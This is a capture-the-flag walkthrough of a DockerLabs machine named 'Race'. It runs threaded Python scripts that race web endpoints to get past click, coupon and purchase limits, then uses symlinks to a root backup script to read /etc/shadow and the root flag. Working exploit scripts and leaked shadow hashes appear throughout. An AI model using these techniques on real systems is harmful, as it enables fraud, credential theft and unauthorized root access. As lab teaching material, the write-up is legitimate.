![Screenshot](/medium/Race/Images/machine.png)

Difficulty: **medium**

Made by: **el pinguino de mario**

# Steps to pwn 🥽

* 👁️  [Reconnaissance](#reconnaissance)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)

---

First of all we make sure the machine is up, we can do this quickly with the command **ping**.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/race]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.235 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.127 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.128 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2039ms
rtt min/avg/max/mdev = 0.127/0.163/0.235/0.050 ms
```

**Note**: with this machine we are going to practice a vulnerability that is  a **race condition** basically we are going to use some **threads** and exploit this so fast to even broke some checks of the system.

Now, we can start our **reconnaissance** phase.

---
# Reconnaissance

First, we use a tool that is **nmap**, to see what ports are open in the target.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/race/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 20:19 -05
Initiating ARP Ping Scan at 20:19
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 20:19, 0.12s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 20:19
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 5000/tcp on 172.17.0.2
Completed SYN Stealth Scan at 20:19, 2.73s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000024s latency).
Scanned at 2025-12-01 20:19:38 -05 for 3s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
5000/tcp open  upnp    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.11 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

When the scan concludes we can see 2 ports open in the target:

- port 22 (ssh / secure shell)
- port 5000 ***(upnp?)***

We can make another nmap scan to see more about these ports.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/race/enumeration]
└─$ nmap -p22,5000 -sCV 172.17.0.2 -oX target --stats-every=1m
```

**-p22,5000** <- With this argument nmap will only scan this 2 ports that we discover.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

**-oX target** <- With this argument we save all the output that nmap give us and save it as a xml file.

**--stats-every=1m** <- With this argument we receive stats of the scan every 1 minute, this can have minutes (m) and seconds (s)

After the scan finish we got the output in a xml file, we do this to make a html page to see the information more easily and pretty to look at.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/race/enumeration]
└─$ xsltproc target -o target.html
```

With this command we convert the xml file to a html file, now let's open it.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/race/enumeration]
└─$ open target.html 
```

And we can see this in our browser.

![Screenshot](/medium/Race/Images/image1.png)

It's way more pretty and more readable. We can see that the port 5000 it's a website, let's take a look with our browser.

![Screenshot](/medium/Race/Images/image2.png)

We can see this, we can click this button **"execute action"** let's intercept the request with **burpsuite**.

```python
POST /click HTTP/1.1
Host: 172.17.0.2:5000
Content-Length: 0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: */*
Sec-GPC: 1
Accept-Language: en-GB,en;q=0.5
Origin: http://172.17.0.2:5000
Referer: http://172.17.0.2:5000/
Accept-Encoding: gzip, deflate, br
Cookie: iconSize=16x16
Connection: keep-alive
```

We can see that it makes a **POST** request when we click in this button, and this is the response in the website:

![Screenshot](/medium/Race/Images/image3.png)

Okay, I'm going to make a **python** script to make a **POST** request over and over again to break the limit of this website.

---
# Exploitation

```python
import requests
import threading

url = "http://172.17.0.2:5000/click"

def execute():
        while True:
                response = requests.post(url=url).text

                if "completada" in response:
                        print("[+] Click yayy!!!")
                else: print("[-] Sad T_T...")

array = [threading.Thread(target=execute).start() for i in range(1000)]
````

Okay so we are going to make a POST request over and over again with threads this can go really fast! and let's hope to even bypass the limit.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/race/exploits]
└─$ python3 exploit.py 
[+] Click yayy!!!
[+] Click yayy!!!
[+] Click yayy!!!
[+] Click yayy!!!
[-] Sad T_T...
[-] Sad T_T...
[-] Sad T_T...
```

And we can see this on the website:

![Screenshot](/medium/Race/Images/image4.png)

We got the credentials to pass to the level 2!

And we can see the next level:

![Screenshot](/medium/Race/Images/image5.png)

The technique it's the same but let's take a look how we can redeem this **discount** and intercept the request with **burpsuite**.

```python
POST /level-2/redeem HTTP/1.1
Host: 172.17.0.2:5000
Content-Length: 19
Authorization: Basic [REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Sec-GPC: 1
Accept-Language: en-GB,en;q=0.5
Origin: http://172.17.0.2:5000
Referer: http://172.17.0.2:5000/level-2
Accept-Encoding: gzip, deflate, br
Cookie: iconSize=16x16
Connection: keep-alive

{
    "code":"TRIAL-10"
}
```

We can use the script that we do it before, and change it a little bit.

```python
import requests
import threading
import json

url = "http://172.17.0.2:5000/level-2/redeem"

heads = {
        "Authorization": "Basic [REDACTED]",
        "Content-Type": "application/json"
}

payload = {
        "code": "TRIAL-10"
}

def execute():
        while True:
                response = requests.post(url=url, headers=heads, data=json.dumps(payload)).text

                if "canjeado" in response:
                        print("[+] Reclaimed Yayyy!!!")
                else: print("[-] Sad T_T...")

array = [threading.Thread(target=execute).start() for i in range(1000)]
```

So now we need to change the headers to send the **Authorization** that we got before and also change the **Content-Type** to **application/json** to send the code in format json, and the payload as data but not forgetting to be in format json (json.dumps)

Now, let's execute the exploit.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/race/exploits]
└─$ python3 exploit.py 
[+] Reclaimed Yayyy!!!
[-] Sad T_T...
[-] Sad T_T...
[-] Sad T_T...
[-] Sad T_T...
[+] Reclaimed Yayyy!!!
[-] Sad T_T...
```

And we can see this in the website:

![Screenshot](/medium/Race/Images/image6.png)

Okay so now we got enough money to buy the subscription!

![Screenshot](/medium/Race/Images/image7.png)

So we get the credentials to pass to the level 3!

![Screenshot](/medium/Race/Images/image8.png)

Okay so it seems we have enough money to buy a bitcoin, but the technique it's the same so let's intercept the request once again with **burpsuite**.

```python
POST /level-3/buy HTTP/1.1
Host: 172.17.0.2:5000
Content-Length: 12
Authorization: Basic [REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Sec-GPC: 1
Accept-Language: en-GB,en;q=0.5
Origin: http://172.17.0.2:5000
Referer: http://172.17.0.2:5000/level-3
Accept-Encoding: gzip, deflate, br
Cookie: iconSize=16x16
Connection: keep-alive

{
    "amount":1
}
```

Okay so now let's modify our exploit again.

```python
import requests
import threading
import json

url = "http://172.17.0.2:5000/level-3/buy"

heads = {
        "Authorization": "Basic [REDACTED]",
        "Content-Type": "application/json"
}

payload = {
        "amount": 1
}

def execute():
        while True:
                response = requests.post(url=url, headers=heads, data=json.dumps(payload)).text

                if "exitosa" in response:
                        print("[+] Yummy Bitcoin!!!")
                else: print("[-] Sad T_T...")

array = [threading.Thread(target=execute).start() for i in range(1000)]
```

Okay so now let's execute our exploit.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/race/exploits]
└─$ python3 exploit.py 
[-] Sad T_T...
[-] Sad T_T...
[+] Yummy Bitcoin!!!
[+] Yummy Bitcoin!!!
[-] Sad T_T...
[-] Sad T_T...
[-] Sad T_T...
[-] Sad T_T...
[-] Sad T_T...
[+] Yummy Bitcoin!!!
```

And we can see this in the website:

![Screenshot](/medium/Race/Images/image9.png)

So we got the credentials to login with ssh!

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/race/exploits]
└─$ ssh racebtc@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:Fn2UBTt82Thn4IZ/6vgyYHLh90t6h4W0Tbz51FIXhC8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
racebtc@172.17.0.2's password: 
Linux 49b878989770 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
racebtc@49b878989770:~$
```

Okay so we can start now our **privilege escalation** phase.

---
# Privilege Escalation

When we enter to the machine with ssh, Immediately we get a exploit to escalate our privileges, but, i'm not going to use it, I'm going to escalate in my own way.

We can see some interesting process in the machine.

```
racebtc@49b878989770:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   4076  2192 ?        Ss   01:13   0:00 /bin/bash /docker-entrypoint.sh
root           7  0.0  0.0   4076  2444 ?        S    01:14   0:01 /bin/bash /usr/local/bin/backup_script.sh
root          22  0.0  0.1  11776  3692 ?        Ss   01:14   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 start
root          23  0.0  0.1  44916  6572 ?        S    01:14   0:00 python3 app.py
root          24  1.5 11.8 14806992 405420 ?     Sl   01:14   1:49 /usr/bin/python3 app.py
root        8639  0.0  0.3  19884 10440 ?        Ss   02:31   0:00 sshd-session: racebtc [priv]
racebtc     8650  0.0  0.2  19848  6924 ?        S    02:32   0:00 sshd-session: racebtc@pts/0
racebtc     8651  0.0  0.1   4340  3704 pts/0    Ss   02:32   0:00 -bash
root        9110  0.0  0.0   2596  1556 ?        S    03:09   0:00 sleep 5
racebtc     9111 25.0  0.1   6404  3688 pts/0    R+   03:09   0:00 ps aux
```

We see a script **backup_script.sh** let's take a look in it.

```bash
#!/bin/bash
# Vulnerable backup script - runs continuously in background as root
# Educational purpose: demonstrates TOCTOU (Time-Of-Check-Time-Of-Use) race condition

BACKUP_DIR="/var/backups/user_files"
USER_DIR="/home/racebtc/backup_me"
LOG_FILE="/tmp/backup_output.txt"

# Ensure directories exist
mkdir -p "$BACKUP_DIR"
mkdir -p "$USER_DIR"

# Make log world-readable
touch "$LOG_FILE"
chmod 666 "$LOG_FILE"

echo "╔════════════════════════════════════════════════════╗" > "$LOG_FILE"
echo "║   Backup Script - Ejecutando como ROOT           ║" >> "$LOG_FILE"
echo "╚════════════════════════════════════════════════════╝" >> "$LOG_FILE"
echo "" >> "$LOG_FILE"

# Run forever checking for files to backup
while true; do
    # Process files marked for backup by users
    for file in "$USER_DIR"/*; do
        if [ -e "$file" ]; then
            echo "[$(date '+%H:%M:%S')] Archivo encontrado: $file" >> "$LOG_FILE"
            
            # VULNERABLE: Race window of 3 seconds!
            echo "[$(date '+%H:%M:%S')] Esperando 3 segundos antes de procesar..." >> "$LOG_FILE"
            sleep 3
            
            # VULNERABLE: Read the file content without re-checking
            echo "[$(date '+%H:%M:%S')] Leyendo contenido del archivo..." >> "$LOG_FILE"
            if [ -f "$file" ]; then
                cat "$file" >> "$LOG_FILE" 2>&1
                echo "" >> "$LOG_FILE"
            fi
            
            # Clean up
            rm -f "$file" 2>/dev/null
            echo "[$(date '+%H:%M:%S')] Archivo procesado y eliminado" >> "$LOG_FILE"
            echo "---" >> "$LOG_FILE"
        fi
    done
    
    # Check every 5 seconds
    sleep 5
done
```

We can see here that the program every 5 seconds (**sleep 5**) searches for files in the **backup_me** directory.

if it finds any file on this directory, the program are going to be in wait for 3 seconds (**sleep 3**)

When the file exists, the program are going to take the content of the file and save it to the logs (```cat "$file" >> "$LOG_FILE"```) The log file exists on the directory **/tmp/backup_output.txt**

So in **summary**, when exists a file in the directory **backup_me** are going to be saved the content of the file in the log file (**backup_output.txt**) But this is **critical**!

Because we can read any file on the system! And how?

There is a function on linux that we can link files on the system to another file, this is called a **symbolic link** for example it exists a file that is **passwd** but this file are linked to the file in **/etc/passwd** so we are really seing the **/etc/passwd** file.

Let's try if this works.

First we enter to the directory that the script are checking into.

```
racebtc@49b878989770:~$ cd backup_me/
```

Okay so we are creating a file with a **symbolic link** to the **/etc/shadow** file. (remember that the **shadow** file only can be seeing as the user **root**)

And the script are running as the user **root** if you remember.

```
racebtc@49b878989770:~/backup_me$ ln -s /etc/shadow funny
racebtc@49b878989770:~/backup_me$ ls
funny
```

Okay so let's wait at least 5 seconds if this it works...

```
racebtc@49b878989770:~/backup_me$ cat /tmp/backup_output.txt 
╔════════════════════════════════════════════════════╗
║   Backup Script - Ejecutando como ROOT           ║
╚════════════════════════════════════════════════════╝

[03:31:18] Archivo encontrado: /home/racebtc/backup_me/funny
[03:31:18] Esperando 3 segundos antes de procesar...
[03:31:21] Leyendo contenido del archivo...
root:$y$j9T$Js9taseqecU82uc9Fr2En/$Fs/oRo5/3o9gB/h1LscVzCm0ozfAY8AgAFhUAziq3sB:20423:0:99999:7:::
daemon:*:20409:0:99999:7:::
bin:*:20409:0:99999:7:::
sys:*:20409:0:99999:7:::
sync:*:20409:0:99999:7:::
games:*:20409:0:99999:7:::
man:*:20409:0:99999:7:::
lp:*:20409:0:99999:7:::
mail:*:20409:0:99999:7:::
news:*:20409:0:99999:7:::
uucp:*:20409:0:99999:7:::
proxy:*:20409:0:99999:7:::
www-data:*:20409:0:99999:7:::
backup:*:20409:0:99999:7:::
list:*:20409:0:99999:7:::
irc:*:20409:0:99999:7:::
_apt:*:20409:0:99999:7:::
nobody:*:20409:0:99999:7:::
systemd-network:!*:20423:::::1:
systemd-timesync:!*:20423:::::1:
messagebus:!*:20423::::::
sshd:!*:20423::::::
racebtc:$y$j9T$PjcpwgTk.Eb9wdsSweh/g.$0/gMG4V/z0a6/LjGoR08f6j1tu.iuW2a1gEUnUg80qC:20423:0:99999:7:::

[03:31:21] Archivo procesado y eliminado
---
```

And we got success! let's try if we can see also see the flag of the user **root**

```
racebtc@49b878989770:~/backup_me$ ln -s /root/flag.txt yayy
```

Okay so let's wait again...

Okay let's see if we can see the content of the flag.

```
racebtc@49b878989770:~/backup_me$ cat /tmp/backup_output.txt 
╔════════════════════════════════════════════════════╗
║   Backup Script - Ejecutando como ROOT           ║
╚════════════════════════════════════════════════════╝

.................

[03:31:21] Archivo procesado y eliminado
---
[03:37:56] Archivo encontrado: /home/racebtc/backup_me/yayy
[03:37:56] Esperando 3 segundos antes de procesar...
[03:37:59] Leyendo contenido del archivo...
FLAG{root_password:[REDACTED]}

[03:37:59] Archivo procesado y eliminado
---
```

We got the password of the user root! let's see if it works...

```
racebtc@49b878989770:~/backup_me$ su
Password: 
root@49b878989770:/home/racebtc/backup_me# whoami
root
```

Now we are root ***...pwned..!***
